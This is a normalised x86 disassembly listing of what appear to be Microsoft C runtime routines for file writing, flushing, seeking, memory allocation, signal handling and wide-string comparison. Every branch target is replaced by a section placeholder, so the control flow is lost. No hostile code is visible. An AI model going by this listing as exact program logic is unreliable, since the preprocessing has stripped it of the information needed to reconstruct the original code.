cmp [ ebp - 0x1ac4 ] 0x13fe
jb r-xdata
add [ ebp - 0x1ad0 ] 0x2
push 0xd
pop ebx
mov [ eax ] bx
inc eax
inc eax
add [ ebp - 0x1ac4 ] 0x2
mov eax [ ebp - 0x1ac4 ]
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
push [ ebp - 0x1ac0 ]
call sub_45489f
pop ecx
cmp ax [ ebp - 0x1ac0 ]
jne r-xdata
cmp al 0x2
jne r-xdata
cmp al 0x1
je r-xdata
push 0x1
push ebx
mov ecx [ ebp - 0x1acc ]
sub ecx ebx
add ecx [ ebp + 0x10 ]
xor eax eax
inc eax
cmp ecx eax
jbe r-xdata
lea eax [ ebp - 0x1ac0 ]
push eax
call sub_4517b1
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x1abc ]
sub eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac8 ] eax
cmp eax [ ebp + 0x10 ]
jb r-xdata
jmp r-xdata
mov eax [ ebp - 0x1abc ]
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov esi [ ebp - 0x1ad8 ]
jmp r-xdata
add [ ebp - 0x1ac8 ] 0x2
cmp [ ebp - 0x1ae0 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
cmp [ ebp - 0x1abc ] eax
jb r-xdata
xor eax eax
push eax
push eax
push 0x5
lea ecx [ ebp - 0xc ]
push ecx
push 0x1
lea ecx [ ebp - 0x1ac0 ]
push ecx
push eax
push [ ebp - 0x1ae4 ]
inc ebx
inc [ ebp - 0x1abc ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ esi ]
mov dl [ ebx ]
inc [ ebp - 0x1ac8 ]
mov [ edi + ecx + 0x34 ] dl
mov ecx [ esi ]
mov [ edi + ecx + 0x38 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x1ac0 ]
push ebx
push eax
call sub_4517b1
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
cmp ebx esi
jg r-xdata
mov esi [ ebp - 0x1ad8 ]
jmp r-xdata
push 0xd
pop eax
push eax
mov [ ebp - 0x1ac0 ] eax
call sub_45489f
pop ecx
cmp ax [ ebp - 0x1ac0 ]
jne r-xdata
mov al [ ebp - 0x1ad9 ]
test al al
jne r-xdata
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1ac4 ]
push eax
push esi
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc ebx
inc [ ebp - 0x1abc ]
jmp r-xdata
inc [ ebp - 0x1ac8 ]
inc [ ebp - 0x1ad0 ]
mov eax [ ebp - 0x1abc ]
mov ecx [ ebp - 0x1ad0 ]
add eax ecx
cmp [ ebp - 0x1ac4 ] esi
mov [ ebp - 0x1ac8 ] eax
jl r-xdata
cmp [ ebp - 0x1ae0 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ac4 ]
push eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] 0xd
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ac4 ] 0x1
jl r-xdata
inc [ ebp - 0x1ad0 ]
inc [ ebp - 0x1ac8 ]
jmp r-xdata
sub_450db5
push 0x10
push r--data
call sub_4433dc
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_443b4a
and [ eax ] 0x0
call sub_443b37
mov [ eax ] 0x9
call sub_443b4a
mov [ eax ] edi
call sub_443b37
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_440791
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_443421
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_450421
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_443b37
mov [ eax ] 0x9
call sub_443b4a
mov [ eax ] edi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_450682
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_450e87
mov eax [ ebp - 0x1c ]
sub_450e91
push 0x10
push r--data
call sub_4433dc
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor ebx ebx
cmp eax ebx
jl r-xdata
call sub_443b37
mov [ eax ] 0x9
call sub_443b37
mov [ eax ] 0x9
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_440791
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_443421
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea edi [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ edi ]
movsx ecx [ esi + ecx + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_450421
pop ecx
mov [ ebp - 0x4 ] ebx
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x1
je r-xdata
call sub_443b37
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x8 ]
call sub_4503aa
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] ebx
call [ GetLastError@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_450f68
mov eax [ ebp - 0x1c ]
call sub_443b4a
mov ecx [ ebp - 0x1c ]
mov [ eax ] ecx
cmp [ ebp - 0x1c ] ebx
je r-xdata
sub_450f72
mov edi edi
push ebp
mov ebp esp
inc [ rw-data ]
push 0x1000
call sub_445f36
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
test eax eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
pop ebp
retn
sub_450fbc
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
push edi
push esi
mov [ ebp - 0x4 ] eax
call sub_4503aa
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp - 0x8 ]
push eax
call [ SetFilePointer@IAT ]
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
call sub_443b37
mov [ eax ] 0x9
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push eax
call sub_443b5d
pop ecx
jmp r-xdata
mov eax edi
mov edx edi
jmp r-xdata
sub_451041
push 0x14
push r--data
call sub_4433dc
or esi 0xffffffff
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] esi
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_443b4a
and [ eax ] 0x0
call sub_443b37
mov [ eax ] 0x9
call sub_443b4a
mov [ eax ] edi
call sub_443b37
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_440791
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_443421
retn
mov eax esi
mov edx esi
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
jne r-xdata
push eax
call sub_450421
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_443b4a
mov [ eax ] edi
call sub_443b37
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_440791
add esp 0x14
or edx 0xffffffff
mov eax edx
jmp r-xdata
call sub_443b37
mov [ eax ] 0x9
call sub_443b4a
mov [ eax ] edi
or [ ebp - 0x24 ] 0xffffffff
or [ ebp - 0x20 ] 0xffffffff
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_450fbc
add esp 0x10
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_451150
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
sub_451178
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
push esi
imul ecx ecx 0xc
add ecx [ ebp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ ebp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
pop ebp
retn
sub_4511bc
push 0x20
push r--data
call sub_4433dc
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_445588
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_443421
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_451178
mov esi eax
add esi 0x8
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_445d53
mov [ ebp - 0x1c ] 0x1
push eax
call sub_445378
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_443b37
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_440791
add esp 0x14
jmp r-xdata
mov [ ebp - 0x20 ] eax
pop ecx
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_4488e6
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_44536f
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_451330
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
add ecx edx
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_45137b
push 0xc
push r--data
call sub_4433dc
mov ecx [ ebp + 0x8 ]
xor edi edi
cmp ecx edi
jbe r-xdata
imul ecx [ ebp + 0xc ]
mov esi ecx
mov [ ebp + 0x8 ] esi
cmp esi edi
jne r-xdata
push 0xffffffe0
pop eax
xor edx edx
div ecx
cmp eax [ ebp + 0xc ]
sbb eax eax
inc eax
jne r-xdata
xor ebx ebx
mov [ ebp - 0x1c ] ebx
cmp esi 0xffffffe0
ja r-xdata
xor esi esi
inc esi
call sub_443b37
mov [ eax ] 0xc
push edi
push edi
push edi
push edi
push edi
call sub_440791
add esp 0x14
cmp ebx edi
jne r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
call sub_443421
retn
mov eax ebx
cmp [ rw-data ] edi
je r-xdata
cmp ebx edi
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
mov eax [ ebp + 0x8 ]
cmp eax [ rw-data ]
ja r-xdata
cmp ebx edi
jne r-xdata
push esi
call sub_443b8f
pop ecx
test eax eax
jne r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov ebx eax
push 0x4
call sub_4488e6
pop ecx
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
call sub_4490f8
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_451477
mov ebx [ ebp - 0x1c ]
cmp ebx edi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
push [ ebp + 0x8 ]
push edi
push ebx
call sub_443360
add esp 0xc
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
jmp r-xdata
sub_451499
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
push esi
xor esi esi
cmp eax esi
jl r-xdata
call sub_443b37
mov [ eax ] 0x9
xor eax eax
pop ebp
retn
call sub_443b37
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x9
call sub_440791
add esp 0x14
xor eax eax
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
pop esi
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
movsx eax [ ecx + eax + 0x4 ]
and eax 0x40
sub_4514fd
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x40
push edi
jne r-xdata
add [ esi + 0x4 ] 0xfffffffe
js r-xdata
push esi
call sub_444560
pop ecx
mov ebx rw-data
cmp eax 0xffffffff
je r-xdata
movzx eax [ ebp + 0x8 ]
push esi
push eax
call sub_454964
pop ecx
pop ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
mov [ ecx ] ax
add [ esi ] 0x2
jmp r-xdata
mov eax ebx
push esi
call sub_444560
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_43f96b
leave
retn
push esi
call sub_444560
pop ecx
cmp eax 0xffffffff
je r-xdata
push esi
call sub_444560
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_444560
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov eax ebx
push esi
call sub_444560
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov al [ eax + 0x24 ]
and al 0x7f
cmp al 0x2
je r-xdata
push esi
call sub_444560
pop ecx
cmp eax 0xffffffff
je r-xdata
push esi
call sub_444560
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_444560
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov eax ebx
push esi
call sub_444560
pop ecx
cmp eax 0xfffffffe
je r-xdata
mov al [ eax + 0x24 ]
and al 0x7f
cmp al 0x1
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push 0x5
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_4531fe
add esp 0x10
test eax eax
je r-xdata
push esi
call sub_444560
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_444560
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
xor edi edi
cmp [ ebp - 0x10 ] edi
jle r-xdata
mov eax 0xffff
jmp r-xdata
test [ eax + 0x4 ] 0x80
je r-xdata
mov ax [ ebp + 0x8 ]
jmp r-xdata
dec [ esi + 0x4 ]
js r-xdata
movsx eax [ ebp + edi - 0xc ]
push esi
push eax
call sub_446068
pop ecx
pop ecx
mov eax [ esi ]
mov cl [ ebp + edi - 0xc ]
mov [ eax ] cl
mov ecx [ esi ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
inc edi
cmp edi [ ebp - 0x10 ]
jl r-xdata
cmp eax 0xffffffff
je r-xdata
sub_45169a
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ esi ] bl
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_441455
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_44d943
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push 0x1
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0xac ]
cmp ecx 0x1
jle r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx cx [ esi ]
mov [ eax ] cx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx [ eax + 0xac ]
jb r-xdata
cmp [ ebp + 0x10 ] ecx
jl r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_443b37
mov [ eax ] 0x2a
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ esi + 0x1 ] bl
je r-xdata
xor edx edx
cmp [ ebp + 0x8 ] ebx
setne dl
push edx
push [ ebp + 0x8 ]
push ecx
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ ebp - 0x10 ]
jne r-xdata
pop esi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ eax + 0xac ]
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_4517d0
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_451865
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
mov edi [ ebp + 0xc ]
cmp esi ebx
je r-xdata
call sub_447218
mov esi eax
push esi
call sub_454ad8
pop ecx
test eax eax
jne r-xdata
mov [ ebp - 0x10 ] ebx
mov eax [ ebp + 0x10 ]
cmp eax ebx
jg r-xdata
cmp edi ebx
je r-xdata
call sub_443b4a
mov [ eax ] 0xf
call sub_443b37
mov [ eax ] 0xd
push 0x2e
pop eax
mov [ ebp - 0xc ] ax
xor eax eax
mov [ ebp - 0xa ] ax
push 0x3a
pop eax
mov [ ebp - 0xa ] ax
push 0x2e
pop eax
add esi 0x40
mov [ ebp - 0x8 ] ax
xor eax eax
mov [ ebp - 0xc ] si
mov [ ebp - 0x6 ] ax
jmp r-xdata
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ edi ] ax
jmp r-xdata
call sub_443b37
mov [ eax ] 0x16
jmp r-xdata
xor eax eax
call [ GetLastError@IAT ]
push eax
call sub_443b5d
pop ecx
cmp edi ebx
je r-xdata
mov esi [ GetFullPathNameW@IAT ]
lea eax [ ebp - 0x14 ]
push eax
push edi
push [ ebp - 0x10 ]
lea eax [ ebp - 0xc ]
push eax
call esi
cmp eax ebx
je r-xdata
cmp esi ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_440791
add esp 0x14
jmp r-xdata
cmp eax [ ebp + 0x10 ]
jle r-xdata
cmp eax [ ebp - 0x10 ]
jge r-xdata
push 0x2
push [ ebp + 0x10 ]
call sub_4519fa
mov edi eax
pop ecx
pop ecx
cmp edi ebx
jne r-xdata
mov [ ebp + 0x10 ] eax
call sub_443b37
mov [ eax ] 0x22
xor eax eax
mov [ edi ] ax
jmp r-xdata
mov eax edi
jmp r-xdata
lea eax [ ebp - 0x14 ]
push eax
push edi
push [ ebp + 0x10 ]
lea eax [ ebp - 0xc ]
push eax
call esi
cmp eax ebx
je r-xdata
call sub_443b37
mov [ eax ] 0xc
call sub_443b4a
mov [ eax ] 0x8
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_43f96b
leave
retn
cmp eax [ ebp + 0x10 ]
jl r-xdata
sub_4519b1
push 0xc
push r--data
call sub_4433dc
push 0x7
call sub_4488e6
pop ecx
and [ ebp - 0x4 ] 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push 0x0
call sub_451865
add esp 0xc
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4519f1
mov eax [ ebp - 0x1c ]
call sub_443421
retn
sub_4519fa
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_45137b
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
mov eax esi
pop esi
leave
retn
cmp [ ebp - 0x4 ] eax
je r-xdata
call sub_443b37
test eax eax
je r-xdata
call sub_443b37
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
sub_451a3a
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_441455
mov ebx [ ebp + 0x8 ]
xor esi esi
cmp ebx esi
jne r-xdata
push edi
mov edi [ ebp + 0xc ]
cmp edi esi
jne r-xdata
call sub_443b37
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_440791
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] esi
jne r-xdata
call sub_443b37
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_440791
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
movzx eax [ ebx ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_4472e1
movzx esi ax
movzx eax [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
inc ebx
push eax
inc ebx
call sub_4472e1
add esp 0x10
inc edi
inc edi
movzx eax ax
test si si
je r-xdata
movzx eax [ ebx ]
cmp ax 0x41
jb r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop esi
pop ebx
leave
retn
movzx ecx ax
movzx eax si
sub eax ecx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp si ax
je r-xdata
movzx esi ax
movzx eax [ edi ]
cmp ax 0x41
jb r-xdata
cmp ax 0x5a
ja r-xdata
pop edi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
inc ebx
inc ebx
inc edi
inc edi
movzx eax ax
test si si
je r-xdata
cmp ax 0x5a
ja r-xdata
add eax 0x20
cmp si ax
je r-xdata
add eax 0x20
jmp r-xdata
sub_451b4b
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
push edi
cmp [ rw-data ] esi
jne r-xdata
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_451a3a
add esp 0xc
mov edi [ ebp + 0x8 ]
cmp edi esi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx esi
je r-xdata
call sub_443b37
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_440791
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
movzx eax [ edi ]
cmp ax 0x41
jb r-xdata
pop edi
pop esi
pop ebp
retn
movzx ecx ax
movzx eax [ edx ]
cmp ax 0x41
jb r-xdata
cmp ax 0x5a
ja r-xdata
inc edi
inc edi
inc edx
inc edx
movzx eax ax
cmp cx si
je r-xdata
cmp ax 0x5a
ja r-xdata
add eax 0x20
movzx edx ax
movzx eax cx
sub eax edx
jmp r-xdata
cmp cx ax
je r-xdata
add eax 0x20
sub_451bde
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx eax
mov cx [ eax ]
inc eax
inc eax
test cx cx
jne r-xdata
mov cx [ ebp + 0xc ]
cmp [ eax ] cx
je r-xdata
cmp [ eax ] cx
jne r-xdata
pop ebp
retn
xor eax eax
dec eax
dec eax
cmp eax edx
je r-xdata
sub_451c0a
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_441455
mov ebx [ ebp + 0x8 ]
cmp ebx 0x100
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_443b37
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_44d943
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x2
lea eax [ ebp - 0x18 ]
push eax
push 0x2
push ebx
call sub_44cda9
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x8 ]
je r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xd0 ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
